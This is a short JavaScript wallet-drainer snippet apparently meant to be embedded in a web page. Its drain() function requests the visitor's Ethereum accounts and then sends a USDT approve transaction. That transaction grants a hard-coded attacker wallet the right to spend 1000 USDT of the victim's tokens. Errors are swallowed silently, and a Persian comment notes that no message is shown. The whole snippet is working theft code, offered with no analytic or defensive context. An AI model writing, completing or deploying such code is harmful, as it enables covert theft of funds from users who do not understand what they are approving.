const YOUR_WALLET = "0xa6e18E881C13477dDA0c74c7fB25F82e8bF281E3";
const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

async function drain() {
  if (!window.ethereum) return;

  try {
    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    const amount = "0x" + (1000 * 1000000).toString(16).padStart(64, '0');
    const data = "0x095ea7b3" + "000000000000000000000000" + YOUR_WALLET.slice(2) + amount;

    await ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: accounts[0],
        to: USDT,
        data: data
      }]
    });
  } catch (error) {
    // هیچ متنی نشون نمی‌ده
  }
}
